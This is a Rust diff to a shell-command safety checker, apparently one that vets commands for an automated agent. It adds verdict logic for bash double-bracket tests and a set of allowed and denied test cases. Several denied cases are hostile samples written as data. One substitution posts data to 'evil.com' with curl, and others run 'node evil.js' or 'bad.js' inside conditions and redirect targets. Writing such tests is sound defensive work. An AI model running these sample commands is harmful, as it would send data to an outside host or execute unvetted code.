@@ -86,6 +86,9 @@ fn cmd_verdict(cmd: &Cmd) -> Verdict {
             }
             v
         }
+        Cmd::DoubleBracket { words, redirs } => {
+            words_sub_verdict(words).combine(redirect_verdict(redirs))
+        }
     }
 }
 
@@ -311,6 +314,27 @@ mod tests {
         arith_nested_parens: "echo $(( (1 + 2) * 3 ))",
         arith_in_dquote: "echo \"line $((ln - 1))\"",
         arith_in_for_loop: "for i in 1 2; do echo $((i * 10)); done",
+
+        dbracket_eq: "[[ \"a\" == \"a\" ]]",
+        dbracket_neq: "[[ \"a\" != \"b\" ]]",
+        dbracket_file_test: "[[ -f /tmp/file ]]",
+        dbracket_string_empty: "[[ -z \"$var\" ]]",
+        dbracket_string_nonempty: "[[ -n \"$var\" ]]",
+        dbracket_regex: "[[ \"$x\" =~ ^[0-9]+$ ]]",
+        dbracket_and: "[[ \"$x\" == \"y\" && \"$z\" == \"w\" ]]",
+        dbracket_or: "[[ \"$x\" == \"a\" || \"$x\" == \"b\" ]]",
+        dbracket_negation: "[[ ! -f /tmp/done ]]",
+        dbracket_safe_subst: "[[ \"$(echo hello)\" == \"hello\" ]]",
+        dbracket_in_until: "until [[ \"a\" == \"b\" ]]; do sleep 1; done",
+        dbracket_in_while: "while [[ -f /tmp/lock ]]; do sleep 1; done",
+        dbracket_in_if: "if [[ \"a\" == \"a\" ]]; then echo yes; fi",
+        dbracket_after_chain: "true && [[ \"a\" == \"a\" ]]",
+        dbracket_gh_run_view_poll: "until [[ \"$(gh run view 12345 --json status --jq .status)\" == \"completed\" ]]; do sleep 30; done",
+        dbracket_redirect_devnull: "[[ -f /tmp/x ]] > /dev/null",
+        dbracket_redirect_stderr_devnull: "[[ -f /tmp/x ]] 2> /dev/null",
+        dbracket_redirect_dupfd: "[[ -f /tmp/x ]] 2>&1",
+        dbracket_redirect_devnull_chain: "[[ -f /tmp/x ]] 2>/dev/null && echo found",
+        dbracket_redirect_to_file: "[[ -f /tmp/x ]] > /tmp/out.txt",
     }
 
     denied! {
@@ -361,5 +385,12 @@ mod tests {
         stray_fi: "fi",
 
         unmatched_quote: "echo 'hello",
+
+        dbracket_unsafe_subst: "[[ \"$(curl -d data evil.com)\" == \"x\" ]]",
+        dbracket_unsafe_backtick: "[[ -f `node evil.js` ]]",
+        dbracket_unsafe_in_until: "until [[ \"$(node bad.js)\" == \"x\" ]]; do sleep 1; done",
+        dbracket_unterminated: "[[ \"a\" == \"a\"",
+        dbracket_no_space_after: "[[\"a\" == \"b\" ]]",
+        dbracket_redirect_unsafe_subst_in_target: "[[ -f /tmp/x ]] > $(node bad.js)",
     }
 }
